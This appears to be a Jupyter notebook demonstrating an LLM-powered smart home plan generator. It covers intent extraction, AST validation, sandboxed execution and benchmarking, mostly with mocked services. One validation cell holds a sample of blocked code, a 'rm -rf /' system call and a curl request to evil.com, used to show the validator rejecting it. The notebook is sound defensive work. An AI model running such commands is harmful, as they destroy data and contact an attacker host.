# RD5: Plan Creation, Storage & Implementation

## Smart Home AI Assistant - LLM-Powered Plan Generation

This notebook demonstrates the core functionality of the RD5 module, which enables:

1. **Intent Extraction** - Understanding user requests
2. **Code Generation** - Creating executable Python plans
3. **Safety Validation** - AST-based security checks
4. **Sandboxed Execution** - Isolated code execution
5. **Semantic Storage** - Weaviate vector search
6. **Benchmarking** - Performance evaluation

---

## Setup

In [ ]:
import sys
import os

# Add project root to path
sys.path.insert(0, os.path.abspath('..'))

# Use mock sandbox for demo (no Docker required)
os.environ['RD5_USE_DOCKER_SANDBOX'] = 'false'

print("Environment configured for RD5 demo")

---
## 1. Synthetic Data Generation

We generate realistic smart home command scenarios for testing and benchmarking.

In [ ]:
from rd5.synthetic.data_generator import (
    generate_test_scenarios,
    generate_smart_home_request,
    DeviceType,
    ActionVerb,
)

# Generate a single scenario
scenario = generate_smart_home_request(
    device_type=DeviceType.LIGHTS,
    include_parameter=True
)

print("Generated Scenario:")
print(f"  Request: {scenario.user_request}")
print(f"  Action: {scenario.expected_action_verb}")
print(f"  Device: {scenario.expected_target_device}")
print(f"  Location: {scenario.expected_location}")
print(f"  Parameters: {scenario.expected_parameters}")

In [ ]:
# Generate multiple scenarios with reproducible seed
scenarios = generate_test_scenarios(count=10, seed=42)

print("Generated 10 Test Scenarios:")
print("=" * 60)
for i, s in enumerate(scenarios, 1):
    status = "✓" if s.should_succeed else "✗"
    print(f"{i:2}. [{s.category:10}] {status} {s.user_request[:50]}")

In [ ]:
# Show distribution by device type
from collections import Counter

categories = Counter(s.category for s in scenarios)
print("\nScenario Distribution:")
for cat, count in sorted(categories.items()):
    bar = "█" * count
    print(f"  {cat:12} {bar} ({count})")

---
## 2. Code Safety Validation

The AST validator ensures generated code is safe to execute by:
- Whitelisting allowed imports
- Blocking dangerous functions (eval, exec, open, etc.)
- Detecting unsafe patterns

In [ ]:
from rd5.execution.validator import CodeValidator

validator = CodeValidator()

# Example: Safe code
safe_code = '''
import json
import asyncio

async def control_lights(brightness: int):
    """Set living room lights to specified brightness."""
    command = {
        "device": "living_room_lights",
        "action": "set_brightness",
        "value": brightness
    }
    return json.dumps(command)

result = asyncio.run(control_lights(75))
print(result)
'''

result = validator.validate(safe_code)
print("Safe Code Validation:")
print(f"  Valid: {result.is_valid}")
print(f"  Imports: {result.imports_found}")
print(f"  Errors: {result.errors}")

In [ ]:
# Example: Unsafe code (blocked)
unsafe_code = '''
import os
import subprocess

# Attempt to access system
os.system("rm -rf /")
subprocess.run(["curl", "http://evil.com"])
'''

result = validator.validate(unsafe_code)
print("Unsafe Code Validation:")
print(f"  Valid: {result.is_valid}")
print(f"  Errors:")
for error in result.errors:
    print(f"    ⚠️  {error}")

In [ ]:
# Show allowed imports
from rd5.config.settings import get_settings

settings = get_settings()
print("Allowed Imports:")
for imp in sorted(settings.allowed_imports):
    print(f"  ✓ {imp}")

---
## 3. Sandboxed Execution

Code is executed in an isolated environment with:
- **Docker mode**: Full container isolation (production)
- **Mock mode**: Restricted Python environment (testing)

In [ ]:
from rd5.execution.sandbox import MockSandbox

sandbox = MockSandbox()

# Execute safe code
code = '''
import json
from datetime import datetime

result = {
    "device": "thermostat",
    "action": "set_temperature",
    "value": 72,
    "timestamp": datetime.now().isoformat()
}
print(json.dumps(result, indent=2))
'''

# In Jupyter, we can use await directly
result = await sandbox.execute(code)
print("Execution Result:")
print(f"  Success: {result.success}")
print(f"  Exit Code: {result.exit_code}")
print(f"  Time: {result.execution_time_ms}ms")
print(f"  Output:")
print(result.stdout)

In [ ]:
# Demonstrate sandbox blocking unsafe imports
unsafe_code = '''
import os
print(os.getcwd())
'''

result = await sandbox.execute(unsafe_code)
print("Unsafe Import Blocked:")
print(f"  Success: {result.success}")
print(f"  Error: {result.stderr}")

---
## 4. LangGraph Workflow

The complete workflow orchestrates 8 nodes:

```
Intent Extraction → Signifier Lookup → Affordance Match
        ↓
Code Generation → Validation → Execution → Storage → Feedback
```

In [ ]:
from rd5.workflow.graph import create_workflow

# Create the workflow
workflow = create_workflow()
graph = workflow.compile()

print("LangGraph Workflow Created")
print(f"  Nodes: {len(workflow.nodes)}")
print("\nWorkflow Nodes:")
for node_name in workflow.nodes:
    print(f"  → {node_name}")

In [ ]:
# Demonstrate individual nodes with mocked LLM
from unittest.mock import patch, MagicMock, AsyncMock
from rd5.workflow.nodes.intent_extraction import intent_extraction_node
from rd5.workflow.state import PlanState, WorkflowStatus
import uuid

# Create initial state
initial_state: PlanState = {
    "request_id": str(uuid.uuid4()),
    "user_request": "Turn on the living room lights and set brightness to 75%",
    "workflow_status": WorkflowStatus.PENDING,
    "extracted_intent": {},
    "signifiers": [],
    "matched_affordances": [],
    "generated_code": None,
    "validation_result": {},
    "execution_result": {},
    "plan_id": None,
    "execution_summary": None,
    "errors": [],
    "retry_count": 0,
}

# Mock the LLM response
mock_intent = {
    "intent": "control lights",
    "action_verb": "turn on",
    "target_objects": ["lights"],
    "location": "living room",
    "parameters": {"brightness": 75},
    "confidence": 0.95
}

# Mock the LLM client
mock_llm = MagicMock()
mock_llm.extract_intent = AsyncMock(return_value=mock_intent)

with patch('rd5.workflow.nodes.intent_extraction.get_llm_client', return_value=mock_llm):
    result_state = await intent_extraction_node(initial_state)

print("Intent Extraction Node:")
print(f"  Input: {initial_state['user_request']}")
print(f"\n  Extracted Intent:")
for key, value in result_state['extracted_intent'].items():
    print(f"    {key}: {value}")

In [ ]:
# Demonstrate code generation node (mocked)
from rd5.workflow.nodes.code_generation import code_generation_node

# Update state with intent and affordances
state_with_intent = result_state.copy()
state_with_intent['matched_affordances'] = [
    {
        "name": "LightControl",
        "type": "hmas:Affordance",
        "actions": ["turnOn", "turnOff", "setBrightness"],
        "endpoint": "http://hmas/lights/living-room"
    }
]

# Mock generated code (simple code that will validate and execute)
mock_code = '''import json

result = {"device": "living_room_lights", "action": "turnOn", "brightness": 75}
print(json.dumps(result))
'''

# Mock the LLM client for code generation
mock_llm = MagicMock()
mock_llm.generate_plan_code = AsyncMock(return_value=mock_code)

with patch('rd5.workflow.nodes.code_generation.get_llm_client', return_value=mock_llm), \
     patch('rd5.workflow.nodes.code_generation.fetch_similar_plans', new_callable=AsyncMock, return_value=[]):
    gen_result_state = await code_generation_node(state_with_intent)

print("Code Generation Node:")
print(f"  Generated Code:")
print("-" * 40)
print(gen_result_state['generated_code'])

In [ ]:
# Demonstrate validation node
from rd5.workflow.nodes.code_validation import code_validation_node

validation_state = await code_validation_node(gen_result_state)

print("Code Validation Node:")
print(f"  Valid: {validation_state['validation_result']['is_valid']}")
print(f"  Imports: {validation_state['validation_result']['imports_found']}")

In [ ]:
# Demonstrate execution node
from rd5.workflow.nodes.sandboxed_execution import sandboxed_execution_node

execution_state = await sandboxed_execution_node(validation_state)

print("Sandboxed Execution Node:")
result = execution_state['execution_result']
print(f"  Success: {result.get('success', False)}")
print(f"  Exit Code: {result.get('exit_code', 'N/A')}")
print(f"  Time: {result.get('execution_time_ms', 0)}ms")
if result.get('stdout'):
    print(f"\n  Output:")
    print(result['stdout'])
if result.get('stderr'):
    print(f"\n  Errors:")
    print(result['stderr'])

---
## 5. End-to-End Workflow Demo

Run the complete workflow with mocked external services.

In [ ]:
import asyncio
from unittest.mock import patch, MagicMock, AsyncMock
from rd5.workflow.graph import run_plan_generation

async def demo_workflow():
    """Run a demo of the complete workflow."""
    
    # Mock LLM responses
    mock_intent = {
        "intent": "turn on lights",
        "action_verb": "turn on",
        "target_objects": ["lights"],
        "location": "bedroom",
        "confidence": 0.92
    }
    
    mock_code = '''import json
result = {"device": "bedroom_lights", "action": "on", "success": True}
print(json.dumps(result))
'''
    
    # Create mock LLM client
    mock_llm = MagicMock()
    mock_llm.extract_intent = AsyncMock(return_value=mock_intent)
    mock_llm.generate_plan_code = AsyncMock(return_value=mock_code)
    mock_llm.generate_summary = AsyncMock(return_value="Bedroom lights turned on successfully.")
    
    # Mock all external services
    with patch('rd5.workflow.nodes.intent_extraction.get_llm_client', return_value=mock_llm), \
         patch('rd5.workflow.nodes.code_generation.get_llm_client', return_value=mock_llm), \
         patch('rd5.workflow.nodes.code_generation.fetch_similar_plans', new_callable=AsyncMock, return_value=[]), \
         patch('rd5.workflow.nodes.result_feedback.get_llm_client', return_value=mock_llm), \
         patch('rd5.workflow.nodes.plan_storage.WeaviateClient') as mock_weaviate:
        
        # Mock Weaviate storage
        mock_weaviate_instance = MagicMock()
        mock_weaviate_instance.connect = MagicMock()
        mock_weaviate_instance.close = MagicMock()
        mock_weaviate_instance.store_plan = MagicMock(return_value="plan-demo-001")
        mock_weaviate.return_value = mock_weaviate_instance
        
        final_state = await run_plan_generation(
            user_request="Turn on the bedroom lights",
            request_id="demo-001"
        )
        
        return final_state

# Run the demo
final_state = await demo_workflow()

print("\n" + "=" * 60)
print("WORKFLOW COMPLETE")
print("=" * 60)
print(f"\nRequest: {final_state['user_request']}")
print(f"Status: {final_state['workflow_status'].value}")
print(f"Plan ID: {final_state.get('plan_id', 'N/A')}")
print(f"\nIntent: {final_state['extracted_intent'].get('intent')}")
print(f"Execution Success: {final_state['execution_result'].get('success')}")
print(f"Summary: {final_state.get('execution_summary', 'N/A')}")

---
## 6. Benchmark Framework

Evaluate workflow performance across multiple scenarios.

In [ ]:
from rd5.synthetic.benchmark import WorkflowBenchmark, BenchmarkSummary
from rd5.synthetic.data_generator import generate_test_scenarios
from rd5.workflow.state import WorkflowStatus

# Generate test scenarios
test_scenarios = generate_test_scenarios(count=15, seed=42)

print(f"Generated {len(test_scenarios)} test scenarios for benchmarking")
print("\nSample scenarios:")
for s in test_scenarios[:5]:
    print(f"  • {s.user_request}")

In [ ]:
# Run benchmark with mocked workflow
async def run_demo_benchmark():
    """Run benchmark with mocked responses."""
    
    # Mock successful workflow response
    mock_state = {
        "extracted_intent": {
            "intent": "control device",
            "action_verb": "turn on",
            "target_objects": ["lights"],
            "location": "living room",
        },
        "generated_code": "print('success')",
        "validation_result": {"is_valid": True},
        "execution_result": {"success": True, "execution_time_ms": 15},
        "plan_id": "plan-bench-001",
        "workflow_status": WorkflowStatus.COMPLETED,
        "errors": [],
    }
    
    with patch('rd5.workflow.graph.run_plan_generation', new_callable=AsyncMock, return_value=mock_state):
        benchmark = WorkflowBenchmark()
        
        # Progress callback
        def show_progress(current, total):
            bar = "█" * int(current / total * 20)
            spaces = " " * (20 - len(bar))
            print(f"\rProgress: [{bar}{spaces}] {current}/{total}", end="", flush=True)
        
        summary = await benchmark.run_benchmark(
            test_scenarios,
            progress_callback=show_progress
        )
        print()  # New line after progress
        
        return summary, benchmark.results

summary, results = await run_demo_benchmark()

In [ ]:
# Display benchmark summary
summary.print_summary()

In [ ]:
# Visualize results
import matplotlib.pyplot as plt

# Success rates by stage
stages = ['Intent', 'Code Gen', 'Validation', 'Execution', 'Storage']
rates = [
    summary.intent_extraction_rate,
    summary.code_generation_rate,
    summary.validation_pass_rate,
    summary.execution_success_rate,
    summary.plan_storage_rate,
]

fig, (ax1, ax2) = plt.subplots(1, 2, figsize=(14, 5))

# Bar chart of success rates
colors = ['#4CAF50' if r >= 0.8 else '#FFC107' if r >= 0.5 else '#F44336' for r in rates]
ax1.bar(stages, [r * 100 for r in rates], color=colors)
ax1.set_ylabel('Success Rate (%)')
ax1.set_title('Workflow Stage Success Rates')
ax1.set_ylim(0, 105)
for i, r in enumerate(rates):
    ax1.text(i, r * 100 + 2, f'{r:.0%}', ha='center')

# Pie chart by category
if summary.success_by_category:
    categories = list(summary.success_by_category.keys())
    cat_rates = list(summary.success_by_category.values())
    ax2.pie([1] * len(categories), labels=categories, autopct=lambda p: f'{cat_rates[int(p/100*len(categories))]:.0%}' if p > 0 else '')
    ax2.set_title('Success Rate by Device Category')

plt.tight_layout()
plt.show()

---
## 7. API Overview

The FastAPI application provides REST endpoints for plan management.

In [ ]:
# Show API endpoints
api_endpoints = [
    ("GET", "/", "API information"),
    ("GET", "/health", "Health check with service status"),
    ("GET", "/status", "System configuration"),
    ("POST", "/plans", "Generate and execute a plan"),
    ("GET", "/plans/{id}", "Get plan by ID"),
    ("GET", "/plans?query=...", "Search plans semantically"),
    ("POST", "/validate", "Validate code without execution"),
]

print("RD5 API Endpoints:")
print("=" * 60)
for method, path, desc in api_endpoints:
    print(f"  {method:6} {path:25} → {desc}")

In [ ]:
# Example API request/response
example_request = {
    "user_request": "Turn on the kitchen lights",
    "request_id": "api-demo-001"  # optional
}

example_response = {
    "request_id": "api-demo-001",
    "status": "completed",
    "plan_id": "plan-abc123",
    "intent": {
        "action_verb": "turn on",
        "target_objects": ["lights"],
        "location": "kitchen"
    },
    "execution_success": True,
    "execution_time_ms": 42,
    "summary": "Kitchen lights turned on successfully."
}

import json
print("Example POST /plans Request:")
print(json.dumps(example_request, indent=2))
print("\nExample Response:")
print(json.dumps(example_response, indent=2))

---
## 8. Architecture Summary

```
┌─────────────────────────────────────────────────────────────────┐
│                         FastAPI                                 │
│  POST /plans  │  GET /plans/{id}  │  GET /plans?query=...      │
└───────────────────────────┬─────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────────┐
│                    LangGraph Workflow                           │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐        │
│  │  Intent  │→ │ Signifier│→ │Affordance│→ │   Code   │        │
│  │Extraction│  │  Lookup  │  │  Match   │  │Generation│        │
│  └──────────┘  └──────────┘  └──────────┘  └────┬─────┘        │
│                                                  │              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌────▼─────┐        │
│  │ Feedback │← │  Plan    │← │Sandboxed │← │   Code   │        │
│  │          │  │ Storage  │  │Execution │  │Validation│        │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘        │
└─────────────────────────────────────────────────────────────────┘
         │              │              │              │
         ▼              ▼              ▼              ▼
    ┌─────────┐   ┌─────────┐   ┌─────────┐   ┌─────────┐
    │ OpenAI  │   │Weaviate │   │ Docker  │   │  RD4    │
    │ GPT-4o  │   │  Vector │   │ Sandbox │   │Signifier│
    │         │   │   DB    │   │         │   │   API   │
    └─────────┘   └─────────┘   └─────────┘   └─────────┘
```

---
## 9. Test Coverage

The implementation includes comprehensive unit and integration tests.

In [ ]:
# Test coverage summary
test_coverage = {
    "test_validator.py": 14,
    "test_workflow.py": 17,
    "test_sandbox.py": 15,
    "test_integration.py": 6,
    "test_api.py": 15,
    "test_synthetic.py": 18,
}

total = sum(test_coverage.values())

print("Test Coverage:")
print("=" * 45)
for test_file, count in test_coverage.items():
    bar = "█" * (count // 2)
    print(f"  {test_file:25} {bar:10} {count:2} tests")
print("=" * 45)
print(f"  {'TOTAL':25} {'':10} {total} tests")

---
## Next Steps

1. **Deploy Services**: Start Docker Compose stack with Weaviate and RD4 API
2. **Configure OpenAI**: Set `OPENAI_API_KEY` for real LLM integration
3. **Connect RD4**: Integrate with colleague's signifier service
4. **Production Testing**: Run benchmarks with real services
5. **Tune Prompts**: Optimize intent extraction and code generation

```bash
# Start services
docker-compose -f docker/docker-compose.yml up -d

# Run API
uvicorn rd5.api.main:app --host 0.0.0.0 --port 8000

# Run tests
python -m pytest tests/rd5/ -v
```